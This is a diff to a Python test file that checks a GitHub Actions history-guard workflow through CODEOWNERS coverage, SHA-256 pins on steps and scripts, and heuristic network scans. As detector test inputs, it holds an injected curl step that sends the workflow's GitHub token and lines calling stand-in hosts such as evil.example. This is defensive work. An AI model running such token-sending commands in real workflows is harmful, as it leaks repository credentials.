@@ -8,12 +8,12 @@ Three things, each tested on the real shipped files:
    tree and over the paths a rewrite touches. This proves the file's coverage,
    not that GitHub enforces it: the live check in the template README is an
    owner step and activation stays blocked until it has been observed.
-2. The README inventory lists every input the workflow and its script read.
-   The workflow is parsed as YAML (expressions, env names, run text) and the
-   script as Python (``env()`` names, API paths, URLs); an input that is not
-   in the README table fails the test, and so does a stale row.
-3. The workflow's hardening is checked structurally and by running the step
-   text on real trees, not by searching for substrings.
+2. The README inventory lists every input name the workflow and its script
+   read (an exact, checked list of names; a stale row fails too).
+3. Change detectors (section 4): every workflow step and every executed file
+   is pinned by SHA-256, so any change fails a test that names it. These are
+   review triggers and best-effort heuristics, NOT a proof that the job cannot
+   reach the network; the real protection is CODEOWNERS plus branch protection.
 """
 
 from __future__ import annotations
@@ -254,13 +254,39 @@ def test_a_wildcard_rule_would_not_cover_a_nested_guard_file() -> None:
     assert not owned("scripts/vendor/evil.py", rules)
 
 
+def coverage_problems(text: str) -> list[str]:
+    """The shipped-file coverage check, over any CODEOWNERS text. Names paths."""
+    rules = parse_codeowners(text)
+    found = [f"{p}: not owned" for p in PROTECTED if not owned(p, rules)]
+    found += [f"{p}: owned but must not be" for p in UNOWNED if owned(p, rules)]
+    return found
+
+
+def test_the_coverage_check_passes_on_the_shipped_file() -> None:
+    assert coverage_problems(CODEOWNERS.read_text(encoding="utf-8")) == []
+
+
 @pytest.mark.parametrize("lost", PROTECTED)
-def test_dropping_every_rule_for_a_protected_path_leaves_it_unowned(lost: str) -> None:
-    # Revert proof: a CODEOWNERS file without the rules that cover the path
-    # fails the coverage check for exactly that path.
-    rules = [(p, o) for p, o in example_rules() if not pattern_regex(p).match(lost)]
-    assert not owned(lost, rules)
-    assert [p for p in PROTECTED if not owned(p, rules)]
+def test_the_coverage_check_names_a_path_whose_rules_were_removed(lost: str) -> None:
+    # Revert proof on the real check: drop every LINE of the shipped file that
+    # covers the path, run the same validator, and it must name that path.
+    lines = CODEOWNERS.read_text(encoding="utf-8").splitlines()
+    kept = [
+        ln
+        for ln in lines
+        if ln.startswith("#")
+        or not ln.strip()
+        or not pattern_regex(ln.split()[0]).match(lost)
+    ]
+    assert len(kept) < len(lines)
+    problems = coverage_problems("\n".join(kept))
+    assert [p for p in problems if p.startswith(f"{lost}:")], problems
+
+
+@pytest.mark.parametrize("path", UNOWNED)
+def test_the_coverage_check_names_a_history_file_that_became_owned(path: str) -> None:
+    text = CODEOWNERS.read_text(encoding="utf-8") + f"/{path} @OWNER-LOGIN\n"
+    assert any(p.startswith(f"{path}:") for p in coverage_problems(text))
 
 
 def test_an_unowning_override_after_the_rules_is_caught() -> None:
@@ -671,21 +697,31 @@ def test_the_sparse_base_checkout_holds_what_the_guard_needs_to_run(
     assert (base / "engine.lock").is_file()
 
 
-# --- 4. the workflow is pinned step by step, and reaches only GitHub ---------
+# --- 4. change detectors for the workflow and what it executes ---------------
 #
-# Inventorying variable NAMES (section 2) does not stop a new step, a second job
-# or a rebuilt URL. These controls do: every job is checked, every step must
-# match one entry of STEP_TABLE, and nothing may call out except to the GitHub
-# API of this repository.
+# READ THIS FIRST. Nothing in this section proves the job cannot reach the
+# network or leak a token: no static check can (a split string, an alias or an
+# indirect command always gets past a scanner). What it does:
 #
-# TO CHANGE THE WORKFLOW ON PURPOSE: edit the workflow, run
+# * STEP_TABLE and EXECUTED_FILES are CHANGE DETECTORS. Every step of the
+#   workflow, and every file the job executes (the guard script and the two
+#   shell scripts), is pinned by SHA-256. A change to any of them, or a new job
+#   or step, fails a test that NAMES the step or file, so it cannot pass by
+#   accident. The table is a REVIEW TRIGGER, not an independent check: a pull
+#   request can update the table in the same change. That is why this file is
+#   owned in the engine repository's CODEOWNERS (test below): updating the table
+#   needs the maintainer's review.
+# * The network and syntax-tree scans (shell_heuristic, script_heuristic) are a
+#   best-effort HEURISTIC: they catch common mistakes and cannot prove the
+#   absence of network use.
+# * The real protection is CODEOWNERS plus branch protection on main (the
+#   boundary the README's live check exercises). Runtime egress confinement of
+#   the job is a separate follow-up.
+#
+# TO CHANGE THE WORKFLOW OR A PINNED SCRIPT ON PURPOSE: make the change, run
 #     python tests/test_history_guard_boundary.py
-# which prints the new table rows, review each changed step by name in the pull
-# request, and paste the rows into STEP_TABLE below. A change that does not
-# update the table fails test_the_workflow_matches_the_pinned_step_table and
-# names the step, so a reviewer cannot miss it. The script's own destinations
-# are checked from its syntax tree (script_problems), not pinned by hash, so
-# ordinary script edits do not need a table change.
+# which prints the new rows, review each changed step or file by name in the
+# pull request, and paste the rows into STEP_TABLE or EXECUTED_FILES below.
 
 import hashlib  # noqa: E402
 import json  # noqa: E402
@@ -776,7 +812,7 @@ STEP_TABLE: list[tuple[str, str, str]] = [
 ]
 
 
-def shell_problems(
+def shell_heuristic(
     text: str, where: str, allow: frozenset[str] = frozenset()
 ) -> list[str]:
     """Network-capable commands and foreign hosts in shell text. Comments are
@@ -815,9 +851,9 @@ def workflow_problems(data: dict[Any, Any]) -> list[str]:
             if "uses" in step and not str(step["uses"]).startswith("actions/checkout@"):
                 found.append(f"{label}: action {step['uses']} is not allowed")
             if "run" in step:
-                found += shell_problems(step["run"], label)
+                found += shell_heuristic(step["run"], label)
             for value in strings(step.get("with", {})):
-                found += shell_problems(value, f"{label} (with)")
+                found += shell_heuristic(value, f"{label} (with)")
             if job_name in ALLOWED_JOBS:
                 entry = table.get(step.get("name", ""))
                 if entry is None:
@@ -833,7 +869,7 @@ def workflow_problems(data: dict[Any, Any]) -> list[str]:
     return found
 
 
-def script_problems(source: str) -> list[str]:
+def script_heuristic(source: str) -> list[str]:
     """Network and execution surface of the guard script, from its syntax tree."""
     tree = ast.parse(source)
     found: list[str] = []
@@ -941,19 +977,19 @@ def test_the_workflow_matches_the_pinned_step_table() -> None:
     assert workflow_problems(workflow()) == []
 
 
-def test_the_script_reaches_only_the_github_api_and_runs_only_git_and_bash() -> None:
-    assert script_problems(GUARD_PY.read_text(encoding="utf-8")) == []
+def test_heuristic_the_script_scan_finds_no_common_network_mistake() -> None:
+    assert script_heuristic(GUARD_PY.read_text(encoding="utf-8")) == []
 
 
 @pytest.mark.parametrize("name", SCRIPTS_RUN_BY_THE_JOB)
-def test_the_shell_scripts_the_job_runs_reach_nothing(name: str) -> None:
+def test_heuristic_the_shell_scan_finds_no_common_network_mistake(name: str) -> None:
     text = (TEMPLATE / "scripts" / name).read_text(encoding="utf-8")
     # The wrapper runs the engine image with docker or podman. The runtime is
     # allowed only here, and only with the network switched off for the run.
     runtimes = (
         frozenset({"docker", "podman"}) if name.startswith("verify") else frozenset()
     )
-    assert shell_problems(text, name, runtimes) == []
+    assert shell_heuristic(text, name, runtimes) == []
     if runtimes:
         run_lines = [ln for ln in text.splitlines() if '"$runtime" run' in ln]
         assert run_lines
@@ -972,7 +1008,7 @@ def guard_step(data: dict[Any, Any]) -> dict[str, Any]:
     return step
 
 
-def test_a_curl_step_in_the_token_step_is_caught() -> None:
+def test_a_curl_step_in_the_token_step_is_caught_by_digest_and_heuristic() -> None:
     def edit(data: dict[Any, Any]) -> None:
         guard_step(data)["run"] += (
             '\ncurl -fsS -H "Authorization: Bearer $GH_TOKEN"'
@@ -1025,7 +1061,7 @@ def test_a_changed_run_text_or_pin_is_caught_by_name() -> None:
     assert any("is not allowed" in p for p in workflow_problems(mutated(other_action)))
 
 
-def test_a_url_in_an_action_input_and_other_network_forms_are_caught() -> None:
+def test_heuristic_common_network_forms_in_shell_text_are_caught() -> None:
     for text in (
         "wget https://api.github.com/x",
         "python3 -c 'print(1)'",
@@ -1034,9 +1070,9 @@ def test_a_url_in_an_action_input_and_other_network_forms_are_caught() -> None:
         "gh api /repos/x/y",
         "echo http://api.github.com.evil.example/x",
     ):
-        assert shell_problems(text, "t"), text
-    assert shell_problems("# curl https://evil.example\necho ok", "t") == []
-    assert shell_problems('python3 -I "$TRUSTED/scripts/history-guard.py"', "t") == []
+        assert shell_heuristic(text, "t"), text
+    assert shell_heuristic("# curl https://evil.example\necho ok", "t") == []
+    assert shell_heuristic('python3 -I "$TRUSTED/scripts/history-guard.py"', "t") == []
 
 
 GUARD_SOURCE = GUARD_PY.read_text(encoding="utf-8")
@@ -1078,12 +1114,92 @@ GUARD_SOURCE = GUARD_PY.read_text(encoding="utf-8")
         ),
     ],
 )
-def test_the_script_checks_bite_on_each_network_mutation(
+def test_heuristic_the_script_scan_bites_on_each_common_mutation(
     old: str, new: str, expect: str
 ) -> None:
     assert old in GUARD_SOURCE, old
-    problems = script_problems(GUARD_SOURCE.replace(old, new, 1))
+    problems = script_heuristic(GUARD_SOURCE.replace(old, new, 1))
     assert any(expect in p for p in problems), (expect, problems)
+
+
+# Every file the job executes from the base commit, pinned by SHA-256 of its
+# bytes (paths relative to the template). A change fails a test that names it.
+EXECUTED_FILES: dict[str, str] = {
+    "scripts/history-guard.py": (
+        "3d71a871db1e19789d787ccdc0e8abae4c16fef31dc2f51dc04c5b6165f0b4dd"
+    ),
+    "scripts/read-lock.sh": (
+        "5513eb5fca385baa53e67ade7f6aec4eeb030629e341769b9072ee0bd2f77e5d"
+    ),
+    "scripts/verify-history-rewrite.sh": (
+        "6c119643ab81d66e707d1d635a231fed0cd373a4fa9f665a8a1bfa51d3cab85b"
+    ),
+}
+
+
+def file_digest(path: Path) -> str:
+    return hashlib.sha256(path.read_bytes()).hexdigest()
+
+
+def executed_problems(root: Path = TEMPLATE) -> list[str]:
+    found: list[str] = []
+    for rel, digest in EXECUTED_FILES.items():
+        target = root / rel
+        if not target.is_file():
+            found.append(f"executed file {rel}: missing")
+        elif file_digest(target) != digest:
+            found.append(
+                f"executed file {rel}: changed; new digest {file_digest(target)}"
+            )
+    return found
+
+
+def test_every_executed_file_matches_its_pinned_digest() -> None:
+    assert executed_problems() == []
+
+
+def test_the_executed_file_table_covers_every_script_the_job_can_run() -> None:
+    """The scripts the workflow and the wrapper name are all in the table."""
+    steps_text = " ".join(s.get("run", "") for s in all_steps())
+    named = set(re.findall(r"scripts/[\w.-]+", steps_text))
+    named |= {f"scripts/{n}" for n in SCRIPTS_RUN_BY_THE_JOB}
+    named |= {p for p in trusted_sparse_paths() if p.startswith("scripts/")}
+    assert named <= set(EXECUTED_FILES), sorted(named - set(EXECUTED_FILES))
+
+
+def test_a_changed_executed_file_fails_and_names_it(tmp_path: Path) -> None:
+    for rel in EXECUTED_FILES:
+        root = tmp_path / rel.replace("/", "_")
+        for other in EXECUTED_FILES:
+            target = root / other
+            target.parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(TEMPLATE / other, target)
+        assert executed_problems(root) == []
+        with (root / rel).open("a", encoding="utf-8") as handle:
+            handle.write("\n# a harmless-looking change\n")
+        problems = executed_problems(root)
+        assert len(problems) == 1 and rel in problems[0], problems
+    (root / rel).unlink()
+    assert any("missing" in p for p in executed_problems(root))
+
+
+def test_the_table_and_this_file_are_owned_in_the_engine_codeowners() -> None:
+    """Updating the pinned tables needs the maintainer's review (last match wins)."""
+    rules = parse_codeowners((ROOT / ".github" / "CODEOWNERS").read_text("utf-8"))
+    for path in (
+        "tests/test_history_guard_boundary.py",
+        ".github/CODEOWNERS",
+        ".github/workflows/ci.yml",
+    ):
+        assert owned(path, rules), path
+
+
+def test_removing_the_engine_rule_for_this_file_is_caught() -> None:
+    text = (ROOT / ".github" / "CODEOWNERS").read_text("utf-8")
+    kept = "\n".join(
+        ln for ln in text.splitlines() if "test_history_guard_boundary" not in ln
+    )
+    assert not owned("tests/test_history_guard_boundary.py", parse_codeowners(kept))
 
 
 def table_rows() -> str:
@@ -1091,9 +1207,10 @@ def table_rows() -> str:
     for step in workflow()["jobs"]["history-guard"]["steps"]:
         kind = step["uses"] if "uses" in step else "run"
         rows.append(f"    ({step['name']!r}, {kind!r}, {step_digest(step)!r}),")
-    return "\n".join(rows)
+    files = [f'    "{rel}": "{file_digest(TEMPLATE / rel)}",' for rel in EXECUTED_FILES]
+    return "\n".join(rows) + "\n\nEXECUTED_FILES:\n" + "\n".join(files)
 
 
 if __name__ == "__main__":
-    print("STEP_TABLE rows for the current workflow:")
+    print("STEP_TABLE rows and EXECUTED_FILES entries for the current files:")
     print(table_rows())
